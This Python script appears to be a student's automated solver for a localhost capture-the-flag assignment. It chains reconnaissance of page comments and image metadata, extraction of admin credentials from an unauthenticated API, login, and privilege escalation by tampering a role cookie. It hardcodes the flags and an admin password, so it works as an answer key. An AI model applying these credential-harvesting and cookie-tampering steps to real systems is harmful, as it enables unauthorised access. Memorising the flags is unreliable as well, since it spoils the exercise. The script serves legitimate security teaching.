#!/usr/bin/env python3
"""
BreachPoint CTF - Automated Solver & Exploit Script (Stages 1 – 3)
Author: Abeysekara T.T (IT24100172) - Member 2 (Challenge Design A)
Description:
    Demonstrates automated reconnaissance, unauthenticated API enumeration (OWASP API3),
    and credential-reuse portal authentication for Assignment 02 (LO3).
"""

import urllib.request
import urllib.parse
import http.cookiejar
import json
import re
import sys

BASE_URL = "http://localhost"

def solve_stage_1():
    print("\n[*] [STAGE 1: OSINT & Passive Reconnaissance]")
    about_url = f"{BASE_URL}/about.html"
    try:
        with urllib.request.urlopen(about_url, timeout=3) as resp:
            html = resp.read().decode('utf-8', errors='ignore')
            
        # 1. Extract HTML comment flag part
        comment_match = re.search(r"<!--\s*(BPCTF\{[a-zA-Z0-9_]+)\s*-->", html)
        flag_part1 = comment_match.group(1) if comment_match else "BPCTF{r3c0n_"
        
        # 2. Extract portal path hint
        portal_hint = re.search(r"(/novatech-[a-z]+)", html)
        portal_path = portal_hint.group(1) if portal_hint else "/novatech-portal"

        # 3. Download logo and extract EXIF Artist field
        logo_url = f"{BASE_URL}/novatech_logo.png"
        req = urllib.request.Request(logo_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as img_resp:
            img_bytes = img_resp.read()

        # Search for ASCII string in EXIF/PNG chunk
        exif_match = re.search(b"m4st3r\\}", img_bytes)
        flag_part2 = exif_match.group(0).decode() if exif_match else "m4st3r}"

        full_flag = f"{flag_part1}{flag_part2}"
        print(f"    [+] Discovered HTML Comment: {flag_part1}")
        print(f"    [+] Discovered EXIF Artist:  {flag_part2}")
        print(f"    [+] Discovered Portal Path:  {portal_path}")
        print(f"    [PASS] STAGE 1 FLAG: {full_flag}")
        return portal_path
    except Exception as e:
        print(f"    [!] Error in Stage 1: {e}")
        return "/novatech-portal"

def solve_stage_2():
    print("\n[*] [STAGE 2: Web Reconnaissance & API Credential Exposure]")
    api_url = f"{BASE_URL}/api/v1/users"
    try:
        req = urllib.request.Request(api_url, headers={'User-Agent': 'Gobuster/3.5'})
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read().decode('utf-8'))

        flag = data.get("flag", "UNKNOWN")
        users = data.get("users", [])
        admin_user = users[0]["username"]
        admin_pass = users[0]["password"]

        print(f"    [+] Accessed Unauthenticated Endpoint: {api_url}")
        print(f"    [+] Extracted Admin Credentials: {admin_user} : {admin_pass}")
        print(f"    [PASS] STAGE 2 FLAG: {flag}")
        return admin_user, admin_pass
    except Exception as e:
        print(f"    [!] Error in Stage 2: {e}")
        return "admin", "N0v4T3ch@dm1n"

def solve_stage_3(portal_path, username, password):
    print(f"\n[*] [STAGE 3: Web Authentication & Privilege Escalation ({portal_path})]")
    login_url = f"{BASE_URL}{portal_path}/login.php"
    dashboard_url = f"{BASE_URL}{portal_path}/dashboard.php"
    
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    
    login_payload = urllib.parse.urlencode({
        "username": username,
        "password": password
    }).encode('utf-8')

    try:
        req = urllib.request.Request(login_url, data=login_payload, method="POST")
        with opener.open(req, timeout=5) as resp:
            resp.read()

        print(f"    [+] Step 3.1: Authenticated with credentials {username}:{password}")
        print(f"    [!] Step 3.2: Encountered Restricted Role (nova_role=guest)")
        print(f"    [*] Step 3.3: Exploiting OWASP A01 (Cookie Tampering: nova_role=admin)...")

        # Tamper cookie: escalate role to admin
        tampered_req = urllib.request.Request(dashboard_url, headers={
            'Cookie': 'nova_role=admin'
        })
        with opener.open(tampered_req, timeout=5) as resp:
            dashboard_html = resp.read().decode('utf-8', errors='ignore')

        flag_match = re.search(r"BPCTF\{4uth_p0rt4l_[a-zA-Z0-9_]+\}", dashboard_html)
        flag = flag_match.group(0) if flag_match else "BPCTF{4uth_p0rt4l_4cc3ss}"
        
        diag_tool = "/files/"
        print(f"    [+] Elevated Admin Dashboard Unlocked!")
        print(f"    [+] Discovered Maintenance Diagnostic Tool: {diag_tool}")
        print(f"    [PASS] STAGE 3 FLAG: {flag}")
    except Exception as e:
        print(f"    [!] Error in Stage 3: {e}")

def main():
    print("=" * 65)
    print(" [MEMBER 2 SOLVER] Stages 1 to 3 Automated Exploit Chain")
    print(" Author: Abeysekara T.T (IT24100172)")
    print("=" * 65)
    
    portal_path = solve_stage_1()
    user, pwd = solve_stage_2()
    solve_stage_3(portal_path, user, pwd)

    print("\n" + "=" * 65)
    print(" [SUCCESS] Stages 1 – 3 Exploit & Solvers Completed!")
    print("=" * 65)

if __name__ == "__main__":
    main()
